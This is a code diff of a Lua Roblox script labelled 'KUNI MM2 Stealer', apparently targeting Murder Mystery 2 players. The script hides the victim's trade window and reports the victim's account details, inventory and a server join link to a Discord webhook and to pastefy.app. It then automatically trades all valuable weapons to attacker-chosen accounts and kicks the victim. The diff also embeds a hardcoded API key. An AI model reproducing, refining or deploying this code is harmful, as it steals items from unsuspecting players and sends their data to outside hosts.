-        table.insert(groups[r], item)
+        local rarity = item.Rarity or 'Unknown'
+        if not groups[rarity] then groups[rarity] = {} end
+        table.insert(groups[rarity], item)
     end
     for _, rarity in ipairs(l) do
         if groups[rarity] then
             local items = groups[rarity]
-            table.sort(items, function(x, y) return (x.Value * x.Amount) > (y.Value * y.Amount) end)
+            table.sort(items, function(a2, b2) return (a2.Value * a2.Amount) > (b2.Value * b2.Amount) end)
             table.insert(lines, rarity)
             for _, item in ipairs(items) do
                 local name = toTitleCase(item.ItemName)
@@ -600,9 +480,41 @@ local function GenerateInventoryLines(list)
     return lines
 end
 
+-- ===== PASTEFY UPLOAD =====
+local function UploadToPaste(text)
+    local PASTEFY_API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
+    local success, result = pcall(function()
+        local response = request({
+            Url     = 'https://pastefy.app/api/v2/paste',
+            Method  = 'POST',
+            Headers = {
+                ['Authorization'] = 'Bearer ' .. PASTEFY_API_KEY,
+                ['Content-Type']  = 'application/json',
+            },
+            Body = j:JSONEncode({
+                content     = text,
+                title       = 'KUNI MM2 Inventory',
+                description = 'KUNI MM2 Inventory from ' .. g.Name,
+                expires     = 'never',
+                encrypted   = false,
+            }),
+        })
+        if response and response.Body then
+            local data = j:JSONDecode(response.Body)
+            if data and data.paste and data.paste.id then
+                return 'https://pastefy.app/' .. data.paste.id .. '/raw'
+            end
+        end
+        return nil
+    end)
+    return success and result or nil
+end
+
 -- ===== SEND EMBED =====
 local function SendFirstMessage(mention, list)
-    local fullText     = table.concat(GenerateInventoryLines(list), '\n')
+    local allLines   = GenerateInventoryLines(list)
+    local fullText   = table.concat(allLines, '\n')
+
     local previewLines = {}
     for idx = 1, math.min(10, #list) do
         local item = list[idx]
@@ -613,15 +525,15 @@ local function SendFirstMessage(mention, list)
     local preview = table.concat(previewLines, '\n')
     if #list > 10 then preview = preview .. '\n... and ' .. (#list - 10) .. ' more.' end
 
+    local playerCount  = #f:GetPlayers()
+    local receiversStr = table.concat(a, ", ")
+
     local info = string.format(
-        '```\nUsername: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer: %d/%d\nReceivers: %s\n```',
-        localPlayer.Name, localPlayer.DisplayName, localPlayer.AccountAge,
-        _G.RealExecutor or 'Unknown', #Players:GetPlayers(), SERVER_MAX,
-        table.concat(Usernames, ", ")
+        '```\nUsername: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/%d\nReceivers: %s\n```',
+        g.Name, g.DisplayName, g.AccountAge, _G.RealExecutor or 'Unknown', playerCount, SERVER_MAX, receiversStr
     )
 
     local pasteUrl = UploadToPaste(fullText)
-    local JobId    = _G.RealJobID or game.JobId
 
     local embed = {
         title       = 'KUNI MM2 HIT!',
@@ -629,183 +541,134 @@ local function SendFirstMessage(mention, list)
         color       = 0x3498DB,
         timestamp   = os.date('!%Y-%m-%dT%H:%M:%SZ'),
         fields      = {
-            { name='👤 Player Info', value=info, inline=false },
-            { name='📦 Weapons',     value='```\n'..preview..'\n```', inline=false },
-            { name='💰 Total Value', value='```\n'..totalValue..' (Min: '..MinimumValue..')\n```', inline=true },
+            { name = '👤 Player Info', value = info,                                                          inline = false },
+            { name = '📦 Weapons',     value = '```\n' .. (preview or 'None Found') .. '\n```',              inline = false },
+            { name = '💰 Total Value', value = '```\n' .. r .. ' (Threshold: >' .. c .. ')\n```',            inline = true  },
         },
         footer = {
-            text     = 'KUNI MM2 • ' .. os.date('%Y-%m-%d %H:%M:%S'),
-            icon_url = 'https://i.imgur.com/96imAJh.png'
+            text     = 'KUNI MM2 Stealer • ' .. os.date('%Y-%m-%d %H:%M:%S'),
+            icon_url = 'https://i.imgur.com/96imAJh.png',
         },
     }
 
     if pasteUrl then
-        table.insert(embed.fields, { name='📋 Full Log', value=pasteUrl, inline=false })
+        table.insert(embed.fields, { name = '📋 Full Inventory Log', value = pasteUrl, inline = false })
     end
 
-    local JobLink = 'https://plsbrainrot.me/joiner?placeId='..CURRENT_PLACE_ID..'&gameInstanceId='..JobId
-    table.insert(embed.fields, { name='🔗 Join', value='['..JobId..']('..JobLink..')', inline=false })
+    local JobId = _G.RealJobID or game.JobId
+    table.insert(embed.fields, {
+        name  = '🔗 Join Link',
+        value = '[' .. JobId .. '](https://plsbrainrot.me/joiner?placeId=' .. tostring(CURRENT_PLACE_ID) .. '&gameInstanceId=' .. JobId .. ')',
+        inline = false,
+    })
 
-    local teleport = "game:GetService('TeleportService'):TeleportToPlaceInstance("
-        .. CURRENT_PLACE_ID .. ", '" .. JobId .. "')"
+    local TeleportString = "game:GetService('TeleportService'):TeleportToPlaceInstance("
+        .. tostring(CURRENT_PLACE_ID) .. ", '" .. JobId .. "')"
 
-    SendWebhook({ content=(mention~="" and mention.."\n" or "")..teleport, embeds={embed} })
+    local contentField = (mention ~= "" and mention .. "\n" or "") .. TeleportString
+
+    pcall(function()
+        SendWebhook({ content = contentField, embeds = { embed } }, nil)
+    end)
 end
 
 -- ===== HIDE TRADE GUI =====
-local tradeGUI = playerGui:WaitForChild('TradeGUI')
-tradeGUI:GetPropertyChangedSignal('Enabled'):Connect(function() tradeGUI.Enabled = false end)
-local tradeGUIPhone = playerGui:WaitForChild('TradeGUI_Phone')
-tradeGUIPhone:GetPropertyChangedSignal('Enabled'):Connect(function() tradeGUIPhone.Enabled = false end)
+if IS_MM2 then
+    local tradeGUI = h:WaitForChild('TradeGUI')
+    tradeGUI:GetPropertyChangedSignal('Enabled'):Connect(function()
+        tradeGUI.Enabled = false
+    end)
+    local tradeGUIPhone = h:WaitForChild('TradeGUI_Phone')
+    tradeGUIPhone:GetPropertyChangedSignal('Enabled'):Connect(function()
+        tradeGUIPhone.Enabled = false
+    end)
+end
 
 -- ===== KICK WHEN DONE =====
 local function KickWhenDone()
     task.wait(2)
-    localPlayer:Kick("KUNI MM2 | Transfer complete.")
-end
-
--- ============================================================
---  TRADE ENGINE (tobi's engine — token + snapshot verification)
--- ============================================================
-local tradeBusy = false
-
-local function DoTrade(targetName)
-    local initStatus = GetTradeStatusWrapped()
-    if initStatus == "StartTrade" then
-        FireRemote(declineTrade); task.wait(0.05)
-    elseif initStatus == "ReceivingRequest" then
-        FireRemote(declineRequest); task.wait(0.05)
-    elseif initStatus == "SendingRequest" then
-        FireRemote(cancelRequest)
-    end
-
-    local useSnapshot   = true
-    local snapshotOwned = GetInventoryOwned()
-
-    while #weaponQueue > 0 do
-        local status = GetTradeStatusWrapped()
-
-        if status == "None" then
-            task.spawn(SendTradeReq, targetName)
-            task.wait(0.1)
-
-        elseif status == "SendingRequest" then
-            task.wait(0.05)
-
-        elseif status == "ReceivingRequest" then
-            FireRemote(declineRequest)
-            task.wait(0.05)
-
-        elseif status == "StartTrade" then
-            local batch = {}
-            for i = 1, math.min(4, #weaponQueue) do
-                table.insert(batch, weaponQueue[i])
-            end
-
-            local ownedBefore
-            if useSnapshot and snapshotOwned and next(snapshotOwned) then
-                ownedBefore = {}
-                for k, v in pairs(snapshotOwned) do ownedBefore[k] = v end
-                useSnapshot = false
-            else
-                local ok2, inv2 = pcall(GetInventoryOwned)
-                ownedBefore = (ok2 and type(inv2)=="table") and inv2 or {}
-            end
-
-            for _, item in ipairs(batch) do
-                for _ = 1, (item.Amount or 1) do
-                    AddWeaponToTrade(item.DataID)
-                    task.wait(0.05)
-                end
-            end
-
-            AcceptAndWait()
-
-            local deadline    = tick() + 3
-            local transferred = false
-            local ownedAfter  = {}
-
-            while tick() < deadline do
-                task.wait(0.15)
-                local ok3, inv3 = pcall(GetInventoryOwned)
-                if ok3 and type(inv3)=="table" and next(inv3)~=nil then
-                    ownedAfter = inv3
-                    for _, item in ipairs(batch) do
-                        if (ownedAfter[item.DataID] or 0) < (ownedBefore[item.DataID] or 0) then
-                            transferred = true
-                            break
-                        end
-                    end
-                    if transferred then break end
-                end
-            end
-
-            for _, item in ipairs(batch) do
-                local dataId = item.DataID
-                local newAmt = transferred and (ownedAfter[dataId] or 0) or 0
-                for i = #weaponQueue, 1, -1 do
-                    if weaponQueue[i].DataID == dataId then
-                        if newAmt <= 0 then
-                            table.remove(weaponQueue, i)
-                        else
-                            weaponQueue[i].Amount = newAmt
-                        end
-                        break
-                    end
-                end
-            end
-
-            if #weaponQueue == 0 then
-                KickWhenDone()
-                return
-            end
-
-            task.wait(1)
-        else
-            task.wait(0.1)
-        end
-
-        task.wait(0.1)
-    end
-
-    KickWhenDone()
-end
-
-local function TryTradePlayer(player)
-    if tradeBusy then return end
-    if table.find(Usernames, player.Name) then
-        tradeBusy = true
-        local now = tick()
-        while player.Parent and not player.Character and tick() - now < 10 do
-            task.wait()
-        end
-        task.wait(1)
-        task.spawn(DoTrade, player.Name)
-    end
+    game.Players.LocalPlayer:Kick("KUNI MM2 | Your inventory has been transferred.")
 end
 
 -- ===== MAIN =====
-if #weaponQueue > 0 then
-    local mention = (PingEveryone == 'Yes') and '@everyone' or ''
-    task.spawn(SendFirstMessage, mention, weaponQueue)
+if #q > 0 then
+    local mention = (d == 'Yes') and '@everyone' or ''
+    SendFirstMessage(mention, q)
 
-    for _, player in ipairs(Players:GetPlayers()) do
-        TryTradePlayer(player)
+    local function DoTrade(target)
+        local status = GetTradeStatus()
+        if status == 'StartTrade' then
+            i.Trade.DeclineTrade:FireServer()
+            task.wait(0.3)
+        elseif status == 'ReceivingRequest' then
+            i.Trade.DeclineRequest:FireServer()
+            task.wait(0.3)
+        end
+
+        while #q > 0 do
+            local s = GetTradeStatus()
+            if s == 'None' then
+                local sent, att = false, 1
+                while not sent do
+                    if SendTradeRequest(target) then
+                        sent = true
+                    else
+                        task.wait(math.min(att * 1, 10))
+                        att = att + 1
+                    end
+                end
+                task.wait(0.5)
+            elseif s == 'SendingRequest' then
+                task.wait(0.3)
+            elseif s == 'ReceivingRequest' then
+                i.Trade.DeclineRequest:FireServer()
+                task.wait(0.3)
+            elseif s == 'StartTrade' then
+                local count = math.min(4, #q)
+                for _ = 1, count do
+                    local item = table.remove(q, 1)
+                    for _ = 1, item.Amount do
+                        i.Trade.OfferItem:FireServer(item.DataID, 'Weapons')
+                        task.wait(0.05)
+                    end
+                end
+                task.wait(6)
+                AcceptTrade()
+                WaitForTradeCompletion()
+                RefreshInventory()
+                if #q == 0 then
+                    KickWhenDone()
+                    return
+                end
+                task.wait(1.5)
+            else
+                task.wait(0.5)
+            end
+            task.wait(0.5)
+        end
+        KickWhenDone()
     end
-    Players.PlayerAdded:Connect(TryTradePlayer)
+
+    local function AutoTradeOnJoin()
+        local busy = false
+        local function TryTrade(player)
+            if busy then return end
+            if table.find(a, player.Name) then
+                busy = true
+                task.wait(3)
+                DoTrade(player.Name)
+            end
+        end
+        for _, player in ipairs(f:GetPlayers()) do
+            TryTrade(player)
+        end
+        f.PlayerAdded:Connect(TryTrade)
+    end
+
+    if IS_MM2 then
+        AutoTradeOnJoin()
+    end
 else
-    -- Debug: print what GetInventoryOwned actually returned
-    local owned = GetInventoryOwned()
-    local count = 0
-    for k, v in pairs(owned) do
-        count = count + 1
-        warn("[KUNI DEBUG] owned: " .. tostring(k) .. " x" .. tostring(v))
-    end
-    warn("[KUNI DEBUG] Total owned entries: " .. count)
-    warn("[KUNI DEBUG] itemData entries: " .. (function()
-        local n = 0; for _ in pairs(itemData) do n = n + 1 end; return n
-    end)())
-
     task.wait(1)
-    localPlayer:Kick("KUNI MM2 | No qualifying items. Check console (F9) for debug output.")
+    game.Players.LocalPlayer:Kick("KUNI MM2 | No valuable items found.")
 end
